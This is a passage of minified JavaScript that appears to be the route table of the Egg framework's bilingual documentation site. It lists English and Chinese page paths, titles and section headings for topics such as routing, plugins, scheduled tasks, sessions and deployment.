Objects",order:2,slugs:[{depth:2,value:"Application",heading:"application"},{depth:3,value:"Events",heading:"events"},{depth:3,value:"How to Get",heading:"how-to-get"},{depth:2,value:"Context",heading:"context"},{depth:3,value:"How to Get",heading:"how-to-get-1"},{depth:2,value:"Request & Response",heading:"request--response"},{depth:3,value:"How to Get",heading:"how-to-get-2"},{depth:2,value:"Controller",heading:"controller"},{depth:2,value:"Service",heading:"service"},{depth:2,value:"Helper",heading:"helper"},{depth:3,value:"How to Get",heading:"how-to-get-3"},{depth:3,value:"Custom helper method",heading:"custom-helper-method"},{depth:2,value:"Config",heading:"config"},{depth:3,value:"How to Get",heading:"how-to-get-4"},{depth:2,value:"Logger",heading:"logger"},{depth:3,value:"App Logger",heading:"app-logger"},{depth:3,value:"App CoreLogger",heading:"app-corelogger"},{depth:3,value:"Context Logger",heading:"context-logger"},{depth:3,value:"Context CoreLogger",heading:"context-corelogger"},{depth:3,value:"Controller Logger & Service Logger",heading:"controller-logger--service-logger"},{depth:2,value:"Subscription",heading:"subscription"}],nav:{path:"/basics",title:"Basic"}},title:"Framework Built-in Objects - Egg"},{path:"/zh-CN/basics/objects",component:n("7Rj7").default,exact:!0,meta:{filePath:"site/docs/basics/objects.zh-CN.md",updatedTime:1687656833e3,title:"\u6846\u67b6\u5185\u7f6e\u57fa\u7840\u5bf9\u8c61",order:2,slugs:[{depth:2,value:"Application",heading:"application"},{depth:3,value:"\u4e8b\u4ef6",heading:"\u4e8b\u4ef6"},{depth:3,value:"\u83b7\u53d6\u65b9\u5f0f",heading:"\u83b7\u53d6\u65b9\u5f0f"},{depth:2,value:"Context",heading:"context"},{depth:3,value:"\u83b7\u53d6\u65b9\u5f0f",heading:"\u83b7\u53d6\u65b9\u5f0f-1"},{depth:2,value:"Request & Response",heading:"request--response"},{depth:3,value:"\u83b7\u53d6\u65b9\u5f0f",heading:"\u83b7\u53d6\u65b9\u5f0f-2"},{depth:2,value:"Controller",heading:"controller"},{depth:2,value:"Service",heading:"service"},{depth:2,value:"Helper",heading:"helper"},{depth:3,value:"\u83b7\u53d6\u65b9\u5f0f",heading:"\u83b7\u53d6\u65b9\u5f0f-3"},{depth:3,value:"\u81ea\u5b9a\u4e49 helper \u65b9\u6cd5",heading:"\u81ea\u5b9a\u4e49-helper-\u65b9\u6cd5"},{depth:2,value:"Config",heading:"config"},{depth:3,value:"\u83b7\u53d6\u65b9\u5f0f",heading:"\u83b7\u53d6\u65b9\u5f0f-4"},{depth:2,value:"Logger",heading:"logger"},{depth:3,value:"App Logger",heading:"app-logger"},{depth:3,value:"App CoreLogger",heading:"app-corelogger"},{depth:3,value:"Context Logger",heading:"context-logger"},{depth:3,value:"Context CoreLogger",heading:"context-corelogger"},{depth:3,value:"Controller Logger & Service Logger",heading:"controller-logger--service-logger"},{depth:2,value:"Subscription",heading:"subscription"}],locale:"zh-CN",nav:{path:"/zh-CN/basics",title:"\u57fa\u7840\u529f\u80fd"}},title:"\u6846\u67b6\u5185\u7f6e\u57fa\u7840\u5bf9\u8c61 - Egg"},{path:"/basics/plugin",component:n("BnjQ").default,exact:!0,meta:{filePath:"site/docs/basics/plugin.md",updatedTime:1687656833e3,title:"Plugin",order:9,slugs:[{depth:2,value:"Why plugins?",heading:"why-plugins"},{depth:3,value:"The Relationship Between Middleware, Plugins and Application",heading:"the-relationship-between-middleware-plugins-and-application"},{depth:2,value:"Using Plugins",heading:"using-plugins"},{depth:3,value:"Configuring Plugins",heading:"configuring-plugins"},{depth:3,value:"Enabling/Disabling plugins",heading:"enablingdisabling-plugins"},{depth:3,value:"Environment Configuration",heading:"environment-configuration"},{depth:3,value:"Package Name and Path",heading:"package-name-and-path"},{depth:2,value:"Plugin Configuration",heading:"plugin-configuration"},{depth:2,value:"Plugin List",heading:"plugin-list"},{depth:2,value:"Developing a Plugin",heading:"developing-a-plugin"}],nav:{path:"/basics",title:"Basic"}},title:"Plugin - Egg"},{path:"/zh-CN/basics/plugin",component:n("QdIm").default,exact:!0,meta:{filePath:"site/docs/basics/plugin.zh-CN.md",updatedTime:1687656833e3,title:"\u63d2\u4ef6",order:9,slugs:[{depth:2,value:"\u4e3a\u4ec0\u4e48\u8981\u63d2\u4ef6",heading:"\u4e3a\u4ec0\u4e48\u8981\u63d2\u4ef6"},{depth:3,value:"\u4e2d\u95f4\u4ef6\u3001\u63d2\u4ef6\u3001\u5e94\u7528\u7684\u5173\u7cfb",heading:"\u4e2d\u95f4\u4ef6\u63d2\u4ef6\u5e94\u7528\u7684\u5173\u7cfb"},{depth:2,value:"\u4f7f\u7528\u63d2\u4ef6",heading:"\u4f7f\u7528\u63d2\u4ef6"},{depth:3,value:"\u53c2\u6570\u4ecb\u7ecd",heading:"\u53c2\u6570\u4ecb\u7ecd"},{depth:3,value:"\u5f00\u542f\u548c\u5173\u95ed",heading:"\u5f00\u542f\u548c\u5173\u95ed"},{depth:3,value:"\u6839\u636e\u73af\u5883\u914d\u7f6e",heading:"\u6839\u636e\u73af\u5883\u914d\u7f6e"},{depth:3,value:"package \u548c path",heading:"package-\u548c-path"},{depth:2,value:"\u63d2\u4ef6\u914d\u7f6e",heading:"\u63d2\u4ef6\u914d\u7f6e"},{depth:2,value:"\u63d2\u4ef6\u5217\u8868",heading:"\u63d2\u4ef6\u5217\u8868"},{depth:2,value:"\u5982\u4f55\u5f00\u53d1\u4e00\u4e2a\u63d2\u4ef6",heading:"\u5982\u4f55\u5f00\u53d1\u4e00\u4e2a\u63d2\u4ef6"}],locale:"zh-CN",nav:{path:"/zh-CN/basics",title:"\u57fa\u7840\u529f\u80fd"}},title:"\u63d2\u4ef6 - Egg"},{path:"/basics/router",component:n("8jQ1").default,exact:!0,meta:{filePath:"site/docs/basics/router.md",updatedTime:1687656833e3,title:"Router",order:6,slugs:[{depth:2,value:"How to Define Router",heading:"how-to-define-router"},{depth:2,value:"Router Config in Detail",heading:"router-config-in-detail"},{depth:3,value:"Notices",heading:"notices"},{depth:3,value:"RESTful Style URL Definition",heading:"restful-style-url-definition"},{depth:2,value:"Router in Action",heading:"router-in-action"},{depth:4,value:"Acquiring Parameters",heading:"acquiring-parameters"},{depth:4,value:"Via Query String",heading:"via-query-string"},{depth:4,value:"Via Named Parameters",heading:"via-named-parameters"},{depth:4,value:"Acquiring Complex Parameters",heading:"acquiring-complex-parameters"},{depth:3,value:"Acquiring Form Contents",heading:"acquiring-form-contents"},{depth:3,value:"Form Verification",heading:"form-verification"},{depth:3,value:"Redirection",heading:"redirection"},{depth:4,value:"Internal Redirection",heading:"internal-redirection"},{depth:4,value:"External Redirection",heading:"external-redirection"},{depth:3,value:"Using Middleware",heading:"using-middleware"},{depth:3,value:"Too Many Routing Maps?",heading:"too-many-routing-maps"}],nav:{path:"/basics",title:"Basic"}},title:"Router - Egg"},{path:"/zh-CN/basics/router",component:n("0bpe").default,exact:!0,meta:{filePath:"site/docs/basics/router.zh-CN.md",updatedTime:1687656833e3,title:"\u8def\u7531\uff08Router\uff09",order:6,slugs:[{depth:2,value:"\u5982\u4f55\u5b9a\u4e49 Router",heading:"\u5982\u4f55\u5b9a\u4e49-router"},{depth:2,value:"Router \u8be6\u7ec6\u5b9a\u4e49\u8bf4\u660e",heading:"router-\u8be6\u7ec6\u5b9a\u4e49\u8bf4\u660e"},{depth:3,value:"\u6ce8\u610f\u4e8b\u9879",heading:"\u6ce8\u610f\u4e8b\u9879"},{depth:3,value:"RESTful \u98ce\u683c\u7684 URL \u5b9a\u4e49",heading:"restful-\u98ce\u683c\u7684-url-\u5b9a\u4e49"},{depth:2,value:"router \u5b9e\u6218",heading:"router-\u5b9e\u6218"},{depth:3,value:"\u53c2\u6570\u83b7\u53d6",heading:"\u53c2\u6570\u83b7\u53d6"},{depth:4,value:"Query String \u65b9\u5f0f",heading:"query-string-\u65b9\u5f0f"},{depth:4,value:"\u53c2\u6570\u547d\u540d\u65b9\u5f0f",heading:"\u53c2\u6570\u547d\u540d\u65b9\u5f0f"},{depth:4,value:"\u590d\u6742\u53c2\u6570\u7684\u83b7\u53d6",heading:"\u590d\u6742\u53c2\u6570\u7684\u83b7\u53d6"},{depth:3,value:"\u8868\u5355\u5185\u5bb9\u7684\u83b7\u53d6",heading:"\u8868\u5355\u5185\u5bb9\u7684\u83b7\u53d6"},{depth:3,value:"\u8868\u5355\u6821\u9a8c",heading:"\u8868\u5355\u6821\u9a8c"},{depth:3,value:"\u91cd\u5b9a\u5411",heading:"\u91cd\u5b9a\u5411"},{depth:4,value:"\u5185\u90e8\u91cd\u5b9a\u5411",heading:"\u5185\u90e8\u91cd\u5b9a\u5411"},{depth:4,value:"\u5916\u90e8\u91cd\u5b9a\u5411",heading:"\u5916\u90e8\u91cd\u5b9a\u5411"},{depth:3,value:"\u4e2d\u95f4\u4ef6\u7684\u4f7f\u7528",heading:"\u4e2d\u95f4\u4ef6\u7684\u4f7f\u7528"},{depth:3,value:"\u592a\u591a\u8def\u7531\u6620\u5c04\uff1f",heading:"\u592a\u591a\u8def\u7531\u6620\u5c04"}],locale:"zh-CN",nav:{path:"/zh-CN/basics",title:"\u57fa\u7840\u529f\u80fd"}},title:"\u8def\u7531\uff08Router\uff09 - Egg"},{path:"/basics/schedule",component:n("RVfi").default,exact:!0,meta:{filePath:"site/docs/basics/schedule.md",updatedTime:1687656833e3,title:"Scheduled Tasks",order:10,slugs:[{depth:2,value:"Develop Scheduled Tasks",heading:"develop-scheduled-tasks"},{depth:3,value:"Task",heading:"task"},{depth:3,value:"Schedule Mode",heading:"schedule-mode"},{depth:4,value:"interval",heading:"interval"},{depth:4,value:"cron",heading:"cron"},{depth:3,value:"Type",heading:"type"},{depth:3,value:"Other Parameters",heading:"other-parameters"},{depth:3,value:"Logging",heading:"logging"},{depth:3,value:"Dynamically Configure Scheduled Tasks",heading:"dynamically-configure-scheduled-tasks"},{depth:2,value:"Manually Execute Scheduled Tasks",heading:"manually-execute-scheduled-tasks"},{depth:2,value:"Extend Scheduled Task Type",heading:"extend-scheduled-task-type"}],nav:{path:"/basics",title:"Basic"}},title:"Scheduled Tasks - Egg"},{path:"/zh-CN/basics/schedule",component:n("oi8Y").default,exact:!0,meta:{filePath:"site/docs/basics/schedule.zh-CN.md",updatedTime:1687656833e3,title:"\u5b9a\u65f6\u4efb\u52a1",order:10,slugs:[{depth:2,value:"\u7f16\u5199\u5b9a\u65f6\u4efb\u52a1",heading:"\u7f16\u5199\u5b9a\u65f6\u4efb\u52a1"},{depth:3,value:"\u4efb\u52a1",heading:"\u4efb\u52a1"},{depth:3,value:"\u5b9a\u65f6\u65b9\u5f0f",heading:"\u5b9a\u65f6\u65b9\u5f0f"},{depth:4,value:"interval",heading:"interval"},{depth:4,value:"cron",heading:"cron"},{depth:3,value:"\u7c7b\u578b",heading:"\u7c7b\u578b"},{depth:3,value:"\u5176\u4ed6\u53c2\u6570",heading:"\u5176\u4ed6\u53c2\u6570"},{depth:3,value:"\u6267\u884c\u65e5\u5fd7",heading:"\u6267\u884c\u65e5\u5fd7"},{depth:3,value:"\u52a8\u6001\u914d\u7f6e\u5b9a\u65f6\u4efb\u52a1",heading:"\u52a8\u6001\u914d\u7f6e\u5b9a\u65f6\u4efb\u52a1"},{depth:2,value:"\u624b\u52a8\u6267\u884c\u5b9a\u65f6\u4efb\u52a1",heading:"\u624b\u52a8\u6267\u884c\u5b9a\u65f6\u4efb\u52a1"},{depth:2,value:"\u6269\u5c55\u5b9a\u65f6\u4efb\u52a1\u7c7b\u578b",heading:"\u6269\u5c55\u5b9a\u65f6\u4efb\u52a1\u7c7b\u578b"}],locale:"zh-CN",nav:{path:"/zh-CN/basics",title:"\u57fa\u7840\u529f\u80fd"}},title:"\u5b9a\u65f6\u4efb\u52a1 - Egg"},{path:"/basics/service",component:n("vajQ").default,exact:!0,meta:{filePath:"site/docs/basics/service.md",updatedTime:1687656833e3,title:"Service",order:8,slugs:[{depth:2,value:"Usage Scenario",heading:"usage-scenario"},{depth:2,value:"Defining Service",heading:"defining-service"},{depth:3,value:"Properties",heading:"properties"},{depth:3,value:"Service ctx in Detail",heading:"service-ctx-in-detail"},{depth:3,value:"Notes",heading:"notes"},{depth:2,value:"Using Service",heading:"using-service"}],nav:{path:"/basics",title:"Basic"}},title:"Service - Egg"},{path:"/zh-CN/basics/service",component:n("+Ooz").default,exact:!0,meta:{filePath:"site/docs/basics/service.zh-CN.md",updatedTime:1687656833e3,title:"\u670d\u52a1\uff08Service\uff09",order:8,slugs:[{depth:2,value:"\u4f7f\u7528\u573a\u666f",heading:"\u4f7f\u7528\u573a\u666f"},{depth:2,value:"\u5b9a\u4e49 Service",heading:"\u5b9a\u4e49-service"},{depth:3,value:"\u5c5e\u6027",heading:"\u5c5e\u6027"},{depth:3,value:"Service ctx \u8be6\u89e3",heading:"service-ctx-\u8be6\u89e3"},{depth:3,value:"\u6ce8\u610f\u4e8b\u9879",heading:"\u6ce8\u610f\u4e8b\u9879"},{depth:2,value:"\u4f7f\u7528 Service",heading:"\u4f7f\u7528-service"}],locale:"zh-CN",nav:{path:"/zh-CN/basics",title:"\u57fa\u7840\u529f\u80fd"}},title:"\u670d\u52a1\uff08Service\uff09 - Egg"},{path:"/basics/structure",component:n("iXkl").default,exact:!0,meta:{filePath:"site/docs/basics/structure.md",updatedTime:1687656833e3,title:"Structure",order:1,slugs:[],nav:{path:"/basics",title:"Basic"}},title:"Structure - Egg"},{path:"/zh-CN/basics/structure",component:n("Le6N").default,exact:!0,meta:{filePath:"site/docs/basics/structure.zh-CN.md",updatedTime:1687656833e3,title:"\u76ee\u5f55\u7ed3\u6784",order:1,slugs:[],locale:"zh-CN",nav:{path:"/zh-CN/basics",title:"\u57fa\u7840\u529f\u80fd"}},title:"\u76ee\u5f55\u7ed3\u6784 - Egg"},{path:"/community/contributing",component:n("W0Nj").default,exact:!0,meta:{filePath:"site/docs/community/CONTRIBUTING.md",updatedTime:1687656833e3,title:"Contribution Guide",slugs:[{depth:2,value:"Reporting New Issues",heading:"reporting-new-issues"},{depth:3,value:"Useful Tags",heading:"useful-tags"},{depth:2,value:"Documentation",heading:"documentation"},{depth:2,value:"Submitting Code",heading:"submitting-code"},{depth:3,value:"Pull Request Guide",heading:"pull-request-guide"},{depth:3,value:"Style Guide",heading:"style-guide"},{depth:3,value:"Commit Message Format",heading:"commit-message-format"},{depth:3,value:"Principles of English Translations",heading:"principles-of-english-translations"},{depth:2,value:"Release Management",heading:"release-management"},{depth:3,value:"Branch Strategy",heading:"branch-strategy"},{depth:3,value:"Release Strategy",heading:"release-strategy"},{depth:4,value:"Preparation",heading:"preparation"},{depth:4,value:"Before Release",heading:"before-release"},{depth:4,value:"During Release",heading:"during-release"}],nav:{path:"/community",title:"Community"}},title:"Contribution Guide - Egg"},{path:"/zh-CN/community/contributing",component:n("UEoX").default,exact:!0,meta:{filePath:"site/docs/community/CONTRIBUTING.zh-CN.md",updatedTime:1687656833e3,title:"\u4ee3\u7801\u8d21\u732e\u89c4\u8303",slugs:[{depth:2,value:"\u63d0\u4ea4 issue",heading:"\u63d0\u4ea4-issue"},{depth:3,value:"\u5e38\u7528\u6807\u7b7e\u8bf4\u660e",heading:"\u5e38\u7528\u6807\u7b7e\u8bf4\u660e"},{depth:2,value:"\u7f16\u5199\u6587\u6863",heading:"\u7f16\u5199\u6587\u6863"},{depth:2,value:"\u63d0\u4ea4\u4ee3\u7801",heading:"\u63d0\u4ea4\u4ee3\u7801"},{depth:3,value:"\u63d0\u4ea4 Pull Request",heading:"\u63d0\u4ea4-pull-request"},{depth:3,value:"\u4ee3\u7801\u98ce\u683c",heading:"\u4ee3\u7801\u98ce\u683c"},{depth:3,value:"Commit \u63d0\u4ea4\u89c4\u8303",heading:"commit-\u63d0\u4ea4\u89c4\u8303"},{depth:3,value:"\u82f1\u8bed\u7ffb\u8bd1\u89c4\u8303",heading:"\u82f1\u8bed\u7ffb\u8bd1\u89c4\u8303"},{depth:2,value:"\u53d1\u5e03\u7ba1\u7406",heading:"\u53d1\u5e03\u7ba1\u7406"},{depth:3,value:"\u5206\u652f\u7b56\u7565",heading:"\u5206\u652f\u7b56\u7565"},{depth:3,value:"\u53d1\u5e03\u7b56\u7565",heading:"\u53d1\u5e03\u7b56\u7565"},{depth:4,value:"\u51c6\u5907\u5de5\u4f5c\uff1a",heading:"\u51c6\u5907\u5de5\u4f5c"},{depth:4,value:"\u53d1\u5e03\u524d\uff1a",heading:"\u53d1\u5e03\u524d"},{depth:4,value:"\u53d1\u5e03\u65f6\uff1a",heading:"\u53d1\u5e03\u65f6"}],locale:"zh-CN",nav:{path:"/zh-CN/community",title:"\u793e\u533a"}},title:"\u4ee3\u7801\u8d21\u732e\u89c4\u8303 - Egg"},{path:"/community/faq",component:n("qxzE").default,exact:!0,meta:{filePath:"site/docs/community/faq.md",updatedTime:1687656833e3,title:"FAQ",order:3,slugs:[{depth:2,value:"How to feedback efficiently?",heading:"how-to-feedback-efficiently"},{depth:2,value:"Why does my config not work?",heading:"why-does-my-config-not-work"},{depth:2,value:"Where are my log files in prod environment?",heading:"where-are-my-log-files-in-prod-environment"},{depth:2,value:"Why not choose PM2 as the process management tool?",heading:"why-not-choose-pm2-as-the-process-management-tool"},{depth:2,value:"How to resolve csrf error?",heading:"how-to-resolve-csrf-error"},{depth:2,value:"In the local development Environment, why is the worker process not restarted automatically when files are modified?",heading:"in-the-local-development-environment-why-is-the-worker-process-not-restarted-automatically-when-files-are-modified"}],nav:{path:"/community",title:"Community"}},title:"FAQ - Egg"},{path:"/zh-CN/community/faq",component:n("ONYO").default,exact:!0,meta:{filePath:"site/docs/community/faq.zh-CN.md",updatedTime:1687656833e3,title:"\u5e38\u89c1\u95ee\u9898",order:3,slugs:[{depth:2,value:"\u5982\u4f55\u9ad8\u6548\u5730\u53cd\u9988\u95ee\u9898\uff1f",heading:"\u5982\u4f55\u9ad8\u6548\u5730\u53cd\u9988\u95ee\u9898"},{depth:2,value:"\u4e3a\u4ec0\u4e48\u6211\u7684\u914d\u7f6e\u4e0d\u751f\u6548\uff1f",heading:"\u4e3a\u4ec0\u4e48\u6211\u7684\u914d\u7f6e\u4e0d\u751f\u6548"},{depth:2,value:"\u7ebf\u4e0a\u7684\u65e5\u5fd7\u6253\u5370\u53bb\u54ea\u91cc\u4e86\uff1f",heading:"\u7ebf\u4e0a\u7684\u65e5\u5fd7\u6253\u5370\u53bb\u54ea\u91cc\u4e86"},{depth:2,value:"\u8fdb\u7a0b\u7ba1\u7406\u4e3a\u4ec0\u4e48\u6ca1\u6709\u9009\u578b PM2 \uff1f",heading:"\u8fdb\u7a0b\u7ba1\u7406\u4e3a\u4ec0\u4e48\u6ca1\u6709\u9009\u578b-pm2-"},{depth:2,value:"\u4e3a\u4ec0\u4e48\u4f1a\u6709 csrf \u62a5\u9519\uff1f",heading:"\u4e3a\u4ec0\u4e48\u4f1a\u6709-csrf-\u62a5\u9519"},{depth:2,value:"\u672c\u5730\u5f00\u53d1\u65f6\uff0c\u4fee\u6539\u4ee3\u7801\u540e\u4e3a\u4ec0\u4e48 worker \u8fdb\u7a0b\u6ca1\u6709\u81ea\u52a8\u91cd\u542f\uff1f",heading:"\u672c\u5730\u5f00\u53d1\u65f6\u4fee\u6539\u4ee3\u7801\u540e\u4e3a\u4ec0\u4e48-worker-\u8fdb\u7a0b\u6ca1\u6709\u81ea\u52a8\u91cd\u542f"}],locale:"zh-CN",nav:{path:"/zh-CN/community",title:"\u793e\u533a"}},title:"\u5e38\u89c1\u95ee\u9898 - Egg"},{path:"/community",component:n("jFhh").default,exact:!0,meta:{filePath:"site/docs/community/index.md",updatedTime:1687656833e3,title:"Community",order:0,nav:{title:"Community",order:6,path:"/community"},slugs:[{depth:2,value:"Resources",heading:"resources"},{depth:2,value:"Sponsors and Backers",heading:"sponsors-and-backers"},{depth:2,value:"Contributors",heading:"contributors"}]},title:"Community - Egg"},{path:"/zh-CN/community",component:n("kiOy").default,exact:!0,meta:{filePath:"site/docs/community/index.zh-CN.md",updatedTime:1687656833e3,title:"\u793e\u533a",order:0,nav:{title:"\u793e\u533a",order:6,path:"/zh-CN/community"},slugs:[{depth:2,value:"\u4ea4\u6d41\u7fa4",heading:"\u4ea4\u6d41\u7fa4"},{depth:2,value:"\u8d44\u6e90\u94fe\u63a5",heading:"\u8d44\u6e90\u94fe\u63a5"},{depth:2,value:"\u9879\u76ee\u8d5e\u52a9",heading:"\u9879\u76ee\u8d5e\u52a9"},{depth:2,value:"\u8d21\u732e\u8005",heading:"\u8d21\u732e\u8005"}],locale:"zh-CN"},title:"\u793e\u533a - Egg"},{path:"/community/style-guide",component:n("tk4r").default,exact:!0,meta:{filePath:"site/docs/community/style-guide.md",updatedTime:1687656833e3,title:"Code Style Guide",slugs:[{depth:2,value:"Classify",heading:"classify"},{depth:2,value:"Private Properties & Lazy Initialization",heading:"private-properties--lazy-initialization"}],nav:{path:"/community",title:"Community"}},title:"Code Style Guide - Egg"},{path:"/zh-CN/community/style-guide",component:n("bmJU").default,exact:!0,meta:{filePath:"site/docs/community/style-guide.zh-CN.md",updatedTime:1687656833e3,title:"\u4ee3\u7801\u98ce\u683c\u6307\u5357",slugs:[{depth:2,value:"\u7528\u7c7b\u7684\u5f62\u5f0f\u5448\u73b0\uff08Classify\uff09",heading:"\u7528\u7c7b\u7684\u5f62\u5f0f\u5448\u73b0classify"},{depth:2,value:"\u79c1\u6709\u5c5e\u6027\u4e0e\u6162\u521d\u59cb\u5316",heading:"\u79c1\u6709\u5c5e\u6027\u4e0e\u6162\u521d\u59cb\u5316"}],locale:"zh-CN",nav:{path:"/zh-CN/community",title:"\u793e\u533a"}},title:"\u4ee3\u7801\u98ce\u683c\u6307\u5357 - Egg"},{path:"/core/cluster-and-ipc",component:n("zNXo").default,exact:!0,meta:{filePath:"site/docs/core/cluster-and-ipc.md",updatedTime:1687656833e3,title:"Multi-Process Model and Inter-Process Communication",order:7,slugs:[{depth:1,value:"What is Cluster?",heading:"what-is-cluster"},{depth:2,value:"Multi-Process Model of the Framework",heading:"multi-process-model-of-the-framework"},{depth:3,value:"Daemon Process",heading:"daemon-process"},{depth:4,value:"Uncaught Exception",heading:"uncaught-exception"},{depth:4,value:"OOM, System Exception",heading:"oom-system-exception"},{depth:3,value:"Agent Mechanism",heading:"agent-mechanism"},{depth:3,value:"Agent Usage",heading:"agent-usage"},{depth:3,value:"Master vs Agent vs Worker",heading:"master-vs-agent-vs-worker"},{depth:4,value:"Master",heading:"master"},{depth:4,value:"Agent",heading:"agent"},{depth:4,value:"Worker",heading:"worker"},{depth:2,value:"Inter-Process Communication(IPC)",heading:"inter-process-communicationipc"},{depth:3,value:"Send",heading:"send"},{depth:4,value:"egg-ready",heading:"egg-ready"},{depth:3,value:"Receive",heading:"receive"},{depth:2,value:"IPC in Practice",heading:"ipc-in-practice"},{depth:3,value:"Requisition",heading:"requisition"},{depth:3,value:"Implementation",heading:"implementation"},{depth:2,value:"More Complex Scenario",heading:"more-complex-scenario"}],nav:{path:"/core",title:"Core"}},title:"Multi-Process Model and Inter-Process Communication - Egg"},{path:"/zh-CN/core/cluster-and-ipc",component:n("9WkI").default,exact:!0,meta:{filePath:"site/docs/core/cluster-and-ipc.zh-CN.md",updatedTime:1687656833e3,title:"\u591a\u8fdb\u7a0b\u6a21\u578b\u548c\u8fdb\u7a0b\u95f4\u901a\u8baf",order:7,slugs:[{depth:2,value:"Cluster \u662f\u4ec0\u4e48\u5462\uff1f",heading:"cluster-\u662f\u4ec0\u4e48\u5462"},{depth:2,value:"\u6846\u67b6\u7684\u591a\u8fdb\u7a0b\u6a21\u578b",heading:"\u6846\u67b6\u7684\u591a\u8fdb\u7a0b\u6a21\u578b"},{depth:3,value:"\u8fdb\u7a0b\u5b88\u62a4",heading:"\u8fdb\u7a0b\u5b88\u62a4"},{depth:4,value:"\u672a\u6355\u83b7\u5f02\u5e38",heading:"\u672a\u6355\u83b7\u5f02\u5e38"},{depth:4,value:"OOM\u3001\u7cfb\u7edf\u5f02\u5e38",heading:"oom\u7cfb\u7edf\u5f02\u5e38"},{depth:3,value:"Agent \u673a\u5236",heading:"agent-\u673a\u5236"},{depth:3,value:"Agent \u7684\u7528\u6cd5",heading:"agent-\u7684\u7528\u6cd5"},{depth:3,value:"Master VS Agent VS Worker",heading:"master-vs-agent-vs-worker"},{depth:4,value:"Master",heading:"master"},{depth:4,value:"Agent",heading:"agent"},{depth:4,value:"Worker",heading:"worker"},{depth:2,value:"\u8fdb\u7a0b\u95f4\u901a\u8baf\uff08IPC\uff09",heading:"\u8fdb\u7a0b\u95f4\u901a\u8bafipc"},{depth:3,value:"\u53d1\u9001",heading:"\u53d1\u9001"},{depth:4,value:"egg-ready",heading:"egg-ready"},{depth:3,value:"\u63a5\u6536",heading:"\u63a5\u6536"},{depth:2,value:"IPC \u5b9e\u6218",heading:"ipc-\u5b9e\u6218"},{depth:3,value:"\u9700\u6c42",heading:"\u9700\u6c42"},{depth:3,value:"\u5b9e\u73b0",heading:"\u5b9e\u73b0"},{depth:2,value:"\u66f4\u590d\u6742\u7684\u573a\u666f",heading:"\u66f4\u590d\u6742\u7684\u573a\u666f"}],locale:"zh-CN",nav:{path:"/zh-CN/core",title:"\u6838\u5fc3\u529f\u80fd"}},title:"\u591a\u8fdb\u7a0b\u6a21\u578b\u548c\u8fdb\u7a0b\u95f4\u901a\u8baf - Egg"},{path:"/core/cookie-and-session",component:n("hDVP").default,exact:!0,meta:{filePath:"site/docs/core/cookie-and-session.md",updatedTime:1687656833e3,title:"Cookie and Session",order:6,slugs:[{depth:2,value:"Cookie",heading:"cookie"},{depth:4,value:"ctx.cookies.set(key, value, options)",heading:"ctxcookiessetkey-value-options"},{depth:4,value:"ctx.cookies.get(key, options)",heading:"ctxcookiesgetkey-options"},{depth:3,value:"Cookie Secret Key",heading:"cookie-secret-key"},{depth:2,value:"Session",heading:"session"},{depth:3,value:"Store Session in Other Storage",heading:"store-session-in-other-storage"},{depth:3,value:"Session Practice",heading:"session-practice"},{depth:4,value:"Set Session's Expiration Time",heading:"set-sessions-expiration-time"},{depth:4,value:"Extend Session's Expiration Time",heading:"extend-sessions-expiration-time"}],nav:{path:"/core",title:"Core"}},title:"Cookie and Session - Egg"},{path:"/zh-CN/core/cookie-and-session",component:n("kZko").default,exact:!0,meta:{filePath:"site/docs/core/cookie-and-session.zh-CN.md",updatedTime:1687656833e3,title:"Cookie \u4e0e Session",order:6,slugs:[{depth:2,value:"Cookie",heading:"cookie"},{depth:4,value:"ctx.cookies.set(key, value, options)",heading:"ctxcookiessetkey-value-options"},{depth:4,value:"ctx.cookies.get(key, options)",heading:"ctxcookiesgetkey-options"},{depth:3,value:"Cookie \u79d8\u94a5",heading:"cookie-\u79d8\u94a5"},{depth:2,value:"Session",heading:"session"},{depth:3,value:"\u6269\u5c55\u5b58\u50a8",heading:"\u6269\u5c55\u5b58\u50a8"},{depth:3,value:"Session \u5b9e\u8df5",heading:"session-\u5b9e\u8df5"},{depth:4,value:"\u4fee\u6539\u7528\u6237 Session \u5931\u6548\u65f6\u95f4",heading:"\u4fee\u6539\u7528\u6237-session-\u5931\u6548\u65f6\u95f4"},{depth:4,value:"\u5ef6\u957f\u7528\u6237 Session \u6709\u6548\u671f",heading:"\u5ef6\u957f\u7528\u6237-session-\u6709\u6548\u671f"}],locale:"zh-CN",nav:{path:"/zh-CN/core",title:"\u6838\u5fc3\u529f\u80fd"}},title:"Cookie \u4e0e Session - Egg"},{path:"/core/deployment",component:n("cPel").default,exact:!0,meta:{filePath:"site/docs/core/deployment.md",updatedTime:1687656833e3,title:"Deployment",order:3,slugs:[{depth:2,value:"Build",heading:"build"},{depth:2,value:"Deploy",heading:"deploy"},{depth:3,value:"Start",heading:"start"},{depth:4,value:"Dispatch with Arguments",heading:"dispatch-with-arguments"},{depth:3,value:"Stop",heading:"stop"}],nav:{path:"/core",title:"Core"}},title:"Deployment - Egg"},{path:"/zh-CN/core/deployment",component:n("q1BL").default,exact:!0,meta:{filePath:"site/docs/core/deployment.zh-CN.md",updatedTime:1687656833e3,title:"\u5e94\u7528\u90e8\u7f72",order:3,slugs:[{depth:2,value:"\u6784\u5efa",heading:"\u6784\u5efa"},{depth:2,value:"\u90e8\u7f72",heading:"\u90e8\u7f72"},{depth:3,value:"\u542f\u52a8\u547d\u4ee4",heading:"\u542f\u52a8\u547d\u4ee4"},{depth:4,value:"\u542f\u52a8\u914d\u7f6e\u9879",heading:"\u542f\u52a8\u914d\u7f6e\u9879"},{depth:3,value:"\u505c\u6b62\u547d\u4ee4",heading:"\u505c\u6b62\u547d\u4ee4"},{depth:2,value:"\u76d1\u63a7",heading:"\u76d1\u63a7"},{depth:3,value:"Node.js \u6027\u80fd\u5e73\u53f0\uff08alinode\uff09",heading:"nodejs-\u6027\u80fd\u5e73\u53f0alinode"},{depth:4,value:"\u5b89\u88c5 Runtime",heading:"\u5b89\u88c5-runtime"},{depth:4,value:"\u5b89\u88c5\u53ca\u914d\u7f6e",heading:"\u5b89\u88c5\u53ca\u914d\u7f6e"},{depth:3,value:"\u542f\u52a8\u5e94\u7528",heading:"\u542f\u52a8\u5e94\u7528"},{depth:4,value:"\u8bbf\u95ee\u63a7\u5236\u53f0",heading:"\u8bbf\u95ee\u63a7\u5236\u53f0"}],locale:"zh-CN",nav:{path:"/zh-CN/core",title:"\u6838\u5fc3\u529f\u80fd"}},title:"\u5e94\u7528\u90e8\u7f72 - Egg"},{path:"/core/development",component:n("BxTA").default,exact:!0,meta:{filePath:"site/docs/core/development.md",updatedTime:1687656833e3,title:"Local Development",order:1,slugs:[{depth:2,value:"Start App",heading:"start-app"},{depth:3,value:"Adding Script",heading:"adding-script"},{depth:3,value:"Environment 